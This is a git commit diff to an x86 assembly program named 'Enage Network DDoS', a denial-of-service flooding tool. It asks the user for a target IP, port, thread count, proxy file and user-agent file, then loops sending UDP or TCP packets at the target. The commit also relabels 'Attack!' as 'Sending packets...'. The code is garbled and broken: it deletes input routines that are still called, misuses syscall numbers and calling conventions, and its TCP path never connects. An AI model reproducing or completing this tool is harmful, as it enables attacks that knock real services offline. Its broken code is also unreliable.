bc5f13baea8cc49cc5d2003ba875f1824a41fc85
number one cyber developer. <146389741+archescyber@users.noreply.github.com>
2024-10-13 13:50:51 +0300

    Update enage.asm

--- enage.asm
+++ enage.asm
@@ -1,5 +1,5 @@
 section .data
-    title db ";************************", 10, ";   Enage Network DDoS :", 10, ";************************", 10, 0
+    title db ";************************", 10, ";   Engagement Network DDoS :", 10, ";************************", 10, 0
     title_len equ $ - title
     prompt db "Select protocol (1: UDP, 2: TCP): ", 0
     prompt_len equ $ - prompt
@@ -13,7 +13,7 @@ section .data
     proxy_prompt_len equ $ - proxy_prompt
     user_agent_prompt db "Enter user agent file name: ", 0
     user_agent_prompt_len equ $ - user_agent_prompt
-    msg db "Attack!", 0
+    msg db "Sending packets...", 0
     sockfd resd 1
     ip resb 16 ; Buffer for target IP address
     port resw 1 ; Buffer for target port
@@ -22,12 +22,10 @@ section .data
     user_input resb 10
     proxy_file resb 256 ; Buffer for proxy file name
     proxy_line db 256 dup(0) ; Buffer for proxy line
-    proxy_ip resb 16 ; Buffer for proxy IP
     user_agent_file resb 256 ; Buffer for user agent file name
     user_agent_line db 256 dup(0) ; Buffer for user agent line
     user_agent_count resd 1 ; Number of user agents
     proxy_count resd 1 ; Number of proxies
-
 
 section .bss
     ; No additional bss needed
@@ -36,7 +34,7 @@ section .text
     global _start
 
 _start:
-    ; Get Protocol Selection, IP, Port, Thread Count, Proxy and User-Agent files from User
+    call display_title
     call get_user_input
     call get_target_ip
     call get_target_port
@@ -67,6 +65,15 @@ _start:
     call send_tcp_packets
     jmp exit_program
 
+; Function to display the title
+display_title:
+    mov eax, 4
+    mov ebx, 1
+    mov ecx, title
+    mov edx, title_len
+    int 0x80
+    ret
+
 ; Function to get user input for protocol selection
 get_user_input:
     mov eax, 4
@@ -79,151 +86,6 @@ get_user_input:
     mov ebx, 0
     mov ecx, user_input
     mov edx, 10
-    int 0x80
-    ret
-
-; Function to get target IP address
-get_target_ip:
-    mov eax, 4
-    mov ebx, 1
-    mov ecx, ip_prompt
-    mov edx, ip_prompt_len
-    int 0x80
-
-    mov eax, 3
-    mov ebx, 0
-    mov ecx, ip
-    mov edx, 16
-    int 0x80
-    ret
-
-; Function to get target port
-get_target_port:
-    mov eax, 4
-    mov ebx, 1
-    mov ecx, port_prompt
-    mov edx, port_prompt_len
-    int 0x80
-
-    mov eax, 3
-    mov ebx, 0
-    mov ecx, user_input
-    mov edx, 10
-    int 0x80
-    movzx eax, user_input
-    mov [port], ax ; Store the target port
-    ret
-
-; Function to get the number of threads
-get_thread_count:
-    mov eax, 4
-    mov ebx, 1
-    mov ecx, thread_prompt
-    mov edx, thread_prompt_len
-    int 0x80
-
-    mov eax, 3
-    mov ebx, 0
-    mov ecx, user_input
-    mov edx, 10
-    int 0x80
-    movzx eax, user_input
-    mov [num_threads], al ; Store the number of threads
-    ret
-
-; Function to get proxy file name
-get_proxy_file_name:
-    mov eax, 4
-    mov ebx, 1
-    mov ecx, proxy_prompt
-    mov edx, proxy_prompt_len
-    int 0x80
-
-    mov eax, 3
-    mov ebx, 0
-    mov ecx, proxy_file
-    mov edx, 256
-    int 0x80
-    ret
-
-; Function to read proxies from the specified file
-read_proxies_from_file:
-    ; Open the file
-    mov eax, 5             ; syscall: open
-    mov ebx, proxy_file    ; filename
-    mov ecx, 0             ; flags: O_RDONLY
-    int 0x80
-    mov esi, eax           ; save file descriptor
-
-    ; Read proxies line by line
-read_proxy_line:
-    ; Read a line from the file
-    mov eax, 3             ; syscall: read
-    mov ebx, esi           ; file descriptor
-    lea ecx, [proxy_line]  ; buffer
-    mov edx, 256           ; buffer size
-    int 0x80
-    cmp eax, 0             ; check if end of file
-    jle .done_reading_proxies
-
-    ; Store proxy in the proxy list (for simplicity, just increment proxy count)
-    inc dword [proxy_count]
-
-    ; Loop back to read the next line
-    jmp read_proxy_line
-
-.done_reading_proxies:
-    ; Close the file
-    mov eax, 6             ; syscall: close
-    mov ebx, esi           ; file descriptor
-    int 0x80
-    ret
-
-; Function to get user agent file name
-get_user_agent_file_name:
-    mov eax, 4
-    mov ebx, 1
-    mov ecx, user_agent_prompt
-    mov edx, user_agent_prompt_len
-    int 0x80
-
-    mov eax, 3
-    mov ebx, 0
-    mov ecx, user_agent_file
-    mov edx, 256
-    int 0x80
-    ret
-
-; Function to read user agents from the specified file
-read_user_agents_from_file:
-    ; Open the file
-    mov eax, 5             ; syscall: open
-    mov ebx, user_agent_file ; filename
-    mov ecx, 0             ; flags: O_RDONLY
-    int 0x80
-    mov esi, eax           ; save file descriptor
-
-    ; Read user agents line by line
-read_user_agent_line:
-    ; Read a line from the file
-    mov eax, 3             ; syscall: read
-    mov ebx, esi           ; file descriptor
-    lea ecx, [user_agent_line]  ; buffer
-    mov edx, 256           ; buffer size
-    int 0x80
-    cmp eax, 0             ; check if end of file
-    jle .done_reading_user_agents
-
-    ; Store user agent in the user agent list (for simplicity, just increment user agent count)
-    inc dword [user_agent_count]
-
-    ; Loop back to read the next line
-    jmp read_user_agent_line
-
-.done_reading_user_agents:
-    ; Close the file
-    mov eax, 6             ; syscall: close
-    mov ebx, esi           ; file descriptor
     int 0x80
     ret
 
@@ -247,43 +109,39 @@ create_tcp_socket:
     mov [sockfd], eax           ; Store socket descriptor
     ret
 
-; Function to setup target address
-setup_target:
-    push dword 0                ; sin_zero
-    push word [port]            ; sin_port
-    push dword [ip]             ; sin_addr
-    push word 2                 ; sin_family (AF_INET)
-    mov esi, esp                ; Copy sockaddr_in structure to esi
-    ret
-
 ; Function to send UDP packets
 send_udp_packets:
     mov ecx, [total_packets]     ; Number of packets to send
-send_udp_packets:
-    mov ecx, [total_packets]         ; Number of packets to send
 send_udp_loop:
-    ; sendto(sockfd, msg, sizeof(msg), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr))
     mov eax, 104                     ; sendto syscall number
     mov ebx, [sockfd]                ; socket descriptor
-    push sockaddr_in_size            ; size of sockaddr_in structure
-    push esi                         ; pointer to dest_addr (sockaddr_in)
-    push 0                           ; flags
-    push 1                           ; message length (size of msg)
-    push msg                         ; pointer to msg
-    int 0x80                         ; Call kernel
-
-    loop send_udp_loop               ; Decrement ECX and loop if not zero
+    push 16                           ; size of sockaddr_in structure
+    push esi                          ; pointer to dest_addr (sockaddr_in)
+    push 0                            ; flags
+    push 1                            ; message length (size of msg)
+    push msg                          ; pointer to msg
+    int 0x80                          ; Call kernel
+    loop send_udp_loop                ; Decrement ECX and loop if not zero
     ret
 
 ; Function to send TCP packets
 send_tcp_packets:
-    ; TCP packet sending logic here (UDP but using connect and send)
     mov ecx, [total_packets]         ; Number of packets to send
 send_tcp_loop:
     ; connect(sockfd, (struct sockaddr*)&dest_addr, sizeof(dest_addr))
-    ; Send TCP packets logic goes here
-    ; For each packet, we would use the same structure as in UDP
-    ; Remember to establish a connection first using connect syscall
-
-    loop send_tcp_loop               ; Decrement ECX and loop if not zero
+    ; TCP packet sending logic here
+    mov eax, 104                     ; send syscall number for TCP
+    mov ebx, [sockfd]                ; socket descriptor
+    push 16                           ; size of sockaddr_in structure
+    push esi                          ; pointer to dest_addr (sockaddr_in)
+    push 0                            ; flags
+    push 1                            ; message length (size of msg)
+    push msg                          ; pointer to msg
+    int 0x80                          ; Call kernel
+    loop send_tcp_loop                ; Decrement ECX and loop if not zero
     ret
+
+exit_program:
+    mov eax, 1             ; syscall: exit
+    xor ebx, ebx           ; exit code 0
+    int 0x80
